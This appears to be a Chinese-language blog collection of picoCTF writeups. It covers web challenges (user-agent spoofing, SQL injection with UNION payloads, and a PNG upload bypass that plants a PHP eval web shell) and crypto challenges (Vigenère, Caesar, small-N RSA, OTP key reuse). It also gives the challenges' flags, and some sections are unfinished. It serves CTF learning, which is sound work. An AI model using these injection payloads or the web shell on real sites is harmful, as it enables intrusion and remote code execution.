---
title: All-in-One PicoCTF Writeups
date: 2024-06-01 10:27:03
categories: 
- [CyberSec, CTF]
mathjax: true
---
# 前言
其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言XD。總之呢這裡就是會盡量彙整所有的picoCTF的題目在這邊（但是因為已經寫了60題左右才開始打算來寫writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的writeup，就這樣啦！希望能幫忙到你。
# Web
## picobrowser
這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。![image](https://hackmd.io/_uploads/SJB9S0p70.png)
他說我們應該要是picobrowser，所以我就寫了一個selenium的Python腳本來運行，看看能不能拿到flag。
```python=
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time

my_user_agent = "picobrowser" # 這裡把agent改為picobrowser
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument(f"--user-agent={my_user_agent}")
service = Service(executable_path=ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=chrome_options)

url = "https://jupiter.challenges.picoctf.org/problem/28921/flag"

driver.get(url)
time.sleep(1337)
```
這樣就得到flag了！
```
picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
```
## More SQLi
把題目launch了之後會進入到一個登入頁面，如下圖。

![題目](https://hackmd.io/_uploads/BySNOmYUC.png)

然後我們先嘗試使用`admin`作為帳號密碼登入。帳號密碼都輸入`admin`後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。

![image](https://hackmd.io/_uploads/r1wnu7KIR.png)

圖片有點小，總之他顯示的內容就是像下面這樣:
```
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```
所以我們在這邊把密碼用`'OR 1=1 --`這串payload作為輸入（帳號可以隨便輸入），整個SQL的query就會變成這樣:
```sql=
SELECT id FROM users WHERE password = ''OR 1=1 --' AND username = 'admin'
```
可以從上面的代碼高亮的顏色發現，在`1=1`後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:

![image](https://hackmd.io/_uploads/rJjw6XYUC.png)

他可以查詢City的名稱，但其實一筆資料包含了City, Address, Phone。分析一下後台可能的SQL語句，應該是如下:
```sql=
SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '';
```
再來因為題目有告訴我們系統使用的是SQLite，所以會有一個叫做`sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）

知道這些候我們輸入`' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個SQL語句變成如下
```sql=
SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '' UNION SELECT name, sql, 1337 FROM sqlite_master; --';
```
這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是sqlite_master的表格內容，如下:

![image](https://hackmd.io/_uploads/BysgmNY8R.png)

我們可以看到被紅色框框圈住的地方就是我們所想獲得的flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段payload`' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！

![image](https://hackmd.io/_uploads/SyoSNNtLA.png)

flag就找到囉！
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```

## Trickster
這題的題目是一個可以上傳png的網頁，看起來就是文件上船漏洞，頁面如下:

![題目](https://hackmd.io/_uploads/HkocKNtIA.png)

~~秉持著不知道要幹嘛的時候先掃路徑的精神~~，可以找到它的robots.txt，它其中禁止了兩個路徑，如下:
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
既然它都禁止了，我們就去看看吧XD。`/uploads/`應該就是它的上船後的文件路徑了，而它instructions.txt的內容如下:
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
所以我們知道後端驗證檔案是否為png的方法有二，其一為檢查文件後綴名是否為`.png`；其二為驗證文件的magic bytes，看文件在十六進制中的前幾個位元組是否為`50 4E 47`。

知道了這些信息後，我們先隨便找一張png圖片上傳看看吧！（我這邊直接隨便截圖，並命名為`hack.png`）。並且在upload的過程中用Burp suite去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為`hack.png.php`，並在檔案內容的PNG以下添加這個[php一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
```php=
<?php @eval($_POST['shell']);?>
```
整個修改完後如下（點開來看可能會比較清楚）:

![image](https://hackmd.io/_uploads/Sy7rFrYU0.png)

上傳完成後，現在這個shell就會位於`https://my_instance_url/uploads/hack.png.php`這個位置上啦。

接下來再用[中國蟻劍](https://github.com/AntSwordProject/antSword)這款工具去連接那個web shell就可以啦，連接過程如下:

![輸入連接資訊](https://hackmd.io/_uploads/HJo4cSF8A.png)

連接完成後，就可以直接看一下網站的文件，看到以下這個`.txt`應該就是flag了。

![貌似是flag的文件](https://hackmd.io/_uploads/SyahqSYLR.png)

![flag出來了](https://hackmd.io/_uploads/HJW1sBtI0.png)

於是我們就成功找到了flag啦！如下:
```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```
這邊補充一個知識點，來講一下`<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟php，所以我們來看看ChatGPT大神是怎麼回答的吧！
>當然，這段PHP代碼的原理是允許遠程執行伺服器上的PHP代碼。這是如何工作的：
>1. `<?php` 是PHP代碼的開始標記。
>2. `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為PHP代碼。這裡的代碼來自於HTTP POST請求中名為 `shell` 的變量。
>3. `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
>4. 由於這段代碼執行任意PHP代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
>
>簡言之，任何通過 `shell` 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。

然後我後來找到了另一篇writeup，它的payload比較酷，是一個即時執行的input框，有興趣可以去看一下[這篇](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)。

# Crypto
>[My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
## Easy1
```
    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 
   +----------------------------------------------------
A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B
D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D
F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E
G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F
H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G
I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H
J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I
K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J
L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K
M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L
N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N
P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O
Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P
R | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q
S | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R
T | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S
U | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T
V | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U
W | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V
X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W
Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X
Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y

Cipher: UFJKXQZQUNB 
Key: SOLVECRYPTO
```
這題是一個維吉尼亞密碼。維吉尼亞密碼（法語：Chiffre de Vigenère，又譯維熱納爾密碼）是使用一系列凱撒密碼組成密碼字母表的加密算法，屬於多表密碼的一種簡單形式。[維基百科](https://zh.wikipedia.org/zh-tw/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81)
解密的方式也很簡單，最上面一列是明文，最左邊那行是KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。
```python=
cipher = "UFJKXQZQUNB"
key = "SOLVECRYPTO"

pt = ""

for i in range(len(cipher)):
    shift = ord(key[i]) - 65  # 獲取密鑰字母的偏移量
    c = ord(cipher[i])  # 獲取密文當中目前的字母

    c = (c - shift - 65) % 26 + 65  # 用偏移量進行解密
    pt += chr(c)

print(f"Message: {pt}")
```
而最後的flag如下
```
picoCTF{CRYPTOISFUN}
```
## Caesar
如同題目所說，這題就是個基本的凱薩加密。題目給了加密過的flag
```
picoCTF{gvswwmrkxlivyfmgsrhnrisegl}
```
就把裡面那串拿去解密，因為不知道偏移量是多少，所以就暴力破解。
```python=
cipher = "gvswwmrkxlivyfmgsrhnrisegl"


def caesar_cipher(text, shift):
    plaintext = ""
    for c in text:
        plaintext += chr((ord(c) - 97 + shift) % 26 + 97)
    return plaintext


for i in range(26):
    plaintext = caesar_cipher(cipher, i)
    print(f"Shift {i}: {plaintext}")
```
跑出來的結果中，看起來是`crossingtherubicondjneoach`最合理，所以這就是flag了
```
picoCTF{crossingtherubicondjneoach}
```
## New Caesar
題目給了一個密文和一個Python腳本。
```
apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna
```
```python=
import string

LOWERCASE_OFFSET = ord("a")
ALPHABET = string.ascii_lowercase[:16]

def b16_encode(plain):
	enc = ""
	for c in plain:
		binary = "{0:08b}".format(ord(c))
		enc += ALPHABET[int(binary[:4], 2)]
		enc += ALPHABET[int(binary[4:], 2)]
	return enc

def shift(c, k):
	t1 = ord(c) - LOWERCASE_OFFSET
	t2 = ord(k) - LOWERCASE_OFFSET
	return ALPHABET[(t1 + t2) % len(ALPHABET)]

flag = "redacted"
key = "redacted"
assert all([k in ALPHABET for k in key])
assert len(key) == 1

b16 = b16_encode(flag)
enc = ""
for i, c in enumerate(b16):
	enc += shift(c, key[i % len(key)])
print(enc)
```
先觀察這個加密腳本。發現他是把明文每個字母的Ascii值轉為Binary後，從左邊補0補到8個Bits，然後
## Mind your Ps and Qs
這題是個RSA加密，先來複習一下RSA加密裡面的各個參數。
:::info
Find two prime numbers p & q
n = p * q 
phi(n) = (p-1) * (q-1)
e is the encryption exponent
d = e^-1 mod phi(n)
c is the encrypted message; c = m^e mod n
m is the message; m = c^d mod n
Public key  = (e, n)
Private key = (d, n)
:::
複習完後，看一下題目的說明。
```
Description:
In RSA, a small e value can be problematic, but what about N? Can you decrypt this?
==============================
Decrypt my super sick RSA:
c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684
n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637
e: 65537
```
這題的敘述中告訴我們，當e太小的時候我們可以使用小公鑰指數攻擊(Low public exponent attack)，而題目要我們思考當N太小的時候我們可以如何利用。

回去看一下RSA加密的流程後，我們發現N是兩個質數的乘積，而當N太小的時候我們就可以暴力破解出兩個P跟Q。這裡我們直接使用FactorDB去找N的因數，就可以找到P和Q了。

而有了P和Q，我們就可以順著RSA流程找到明文M了，我寫了個Python幫我找出明文，如下
```python=
from Crypto.Util.number import inverse, long_to_bytes
from factordb.factordb import FactorDB


def long2str(long_int: int) -> str:
    return long_to_bytes(long_int).decode()


c = 421345306292040663864066688931456845278496274597031632020995583473619804626233684
n = 631371953793368771804570727896887140714495090919073481680274581226742748040342637
e = 65537

# From Factor db find p and q
f = FactorDB(n)
f.connect()
factors = f.get_factor_list()
p = factors[0]
q = factors[1]

phi_n = (p - 1) * (q - 1)

d = inverse(e, phi_n)
print(f"Private key: d = {d}")
m = pow(c, d, n)
print(f"Decrypted message: m = {long2str(m)}")
```
最後找到的明文會是一個很大的數字，這時候再用Crypto.Util.number的long_to_bytes並decode，將其轉為字符串，就可以得到flag了。
```
picoCTF{sma11_N_n0_g0od_55304594}
```

## No padding, no problem
> 可以先看過這篇 [Day 14:[離散數學]同餘（Mod）是什麼？](https://ithelp.ithome.com.tw/articles/10205727)

當我們把題目給的密文拿去解密，他會說`Will not decrypt the ciphertext. Try Again`。代表題目的這支程式應該是在偵測我們輸入的是否為Ciphertext。而我們知道
$$
Plaintext = c^d \mod n 
$$
$$
c^d \mod n = (c+n)^d \mod n
$$
所以我們利用題目給的c和n相加後，輸入到他的程式會得到:
```
Here you go: 290275030195850039473456618367455885069965748851278076756743720446703314517401359267322769037469251445384426639837648598397
```
接著只要再利用Crypto的long_to_bytes3方法就可以找到明文，如下:
```python=
from Crypto.Util.number import long_to_bytes
from pwn import *

r = remote("mercury.picoctf.net", 10333)
r.recvuntil("n:")
n = int(r.recvline().strip())
r.recvuntil("ciphertext:")
c = int(r.recvline().strip())
num = n + c
r.sendline(str(num))
r.recvuntil("Here you go:")
m = int(r.recvline().strip())
r.close()

print(long_to_bytes(m))
```
```
picoCTF{m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735}
```
## Easy peasy
> 想了解OTP可以去看看這個 [一次性密碼本](https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC)

先看題目。
```
******************Welcome to our OTP implementation!******************
This is the encrypted flag!
551e6c4c5e55644b56566d1b5100153d4004026a4b52066b4a5556383d4b0007

What data would you like to encrypt?
```
在這題中，我們要先閱讀他給我們的Code。在encrypt函式中我們可以看到一些事情。因為題目給的Cipher的長度為64，又因為他是以十六進制的方式輸出Cipher，所以我們可以知道他用掉的`key_location`長度為32，也就是說，我們下次在加密的時候是用第33位開始的key。
```pytho=
def encrypt(key_location):
    ui = input("What data would you like to encrypt? ").rstrip()
    if len(ui) == 0 or len(ui) > KEY_LEN:
        return -1

    start = key_location  # 這裡從32開始
    stop = key_location + len(ui)

    kf = open(KEY_FILE, "rb").read()

    if stop >= KEY_LEN:
        stop = stop % KEY_LEN
        key = kf[start:] + kf[:stop]
    else:
        key = kf[start:stop]
    key_location = stop

    result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), ui, key))

    print("Here ya go!\n{}\n".format("".join(result)))

    return key_location
```
知道了我們第一次輸入要加密的銘文是從第32個key開始後，我們要想辦法可以使用到跟題目一樣的那組key，而在程式碼的這個區段我們可以發現一些事。
```python=
if stop >= KEY_LEN:
        stop = stop % KEY_LEN
        key = kf[start:] + kf[:stop]
```
在這邊，如果我們讓`stop`和`KEY_LEN`相等，讓`stop % KEY_LEN == 0`的話，`stop`就會被設定為0，所以我們就可以讓one-time pad被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個50000循環結束，再進入一次循環後我們就可以得到跟題目一樣的key了。

然後因為他加密的方法是用計算XOR的方式，所以我們可以簡單地透過再計算一次XOR得到明文，如下:
> $$key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key$$
```python=
from pwn import *
import binascii  # binascii.unhexlify() is used to convert hex to binary

offset = 50000 - 32

r = remote("mercury.picoctf.net", 11188)

print(r.recvline())
print(r.recvline())
encrypted_flag = r.recvline().strip()

print(encrypted_flag)

r.recvuntil(b"?")
r.sendline(b"A" * offset)
r.recvuntil(b"?")
r.sendline(b"A" * 32)
r.recvline()

encoded = r.recvline().strip()
encoded = binascii.unhexlify(encoded)

message = "A" * 32
key = []
for i in range(len(encoded)):
    key.append(ord(message[i]) ^ encoded[i])

flag = []
encrypted_flag = binascii.unhexlify(encrypted_flag)
for i in range(len(encrypted_flag)):
    flag.append(chr(key[i] ^ encrypted_flag[i]))

flag = "".join(flag)
print(flag)

```
# Pwn 
# Forensic
# Reverse
# Misc
